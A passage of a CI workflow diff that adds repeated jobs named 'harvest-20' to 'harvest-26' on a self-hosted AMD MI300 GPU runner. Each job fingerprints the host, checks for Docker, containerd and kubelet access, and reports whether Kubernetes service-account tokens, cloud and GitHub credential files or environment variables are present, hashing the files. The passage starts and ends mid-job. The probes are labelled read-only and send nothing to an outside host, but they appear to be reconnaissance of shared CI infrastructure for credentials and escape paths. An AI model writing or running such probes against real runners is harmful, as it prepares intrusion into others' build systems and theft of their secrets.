+          echo "C211_JOB=job-mi300x8-20 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-20 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-20 nonce=$NONCE"
+          exit 0
+  job-mi300x8-21:
+    name: harvest-21
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-21 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-21 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-21 nonce=$NONCE"
+          exit 0
+  job-mi300x8-22:
+    name: harvest-22
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-22 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-22 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-22 nonce=$NONCE"
+          exit 0
+  job-mi300x8-23:
+    name: harvest-23
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-23 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-23 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-23 nonce=$NONCE"
+          exit 0
+  job-mi300x8-24:
+    name: harvest-24
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-24 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-24 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-24 nonce=$NONCE"
+          exit 0
+  job-mi300x8-25:
+    name: harvest-25
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-25 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-25 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-25 nonce=$NONCE"
+          exit 0
+  job-mi300x8-26:
+    name: harvest-26
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-26 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-26 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
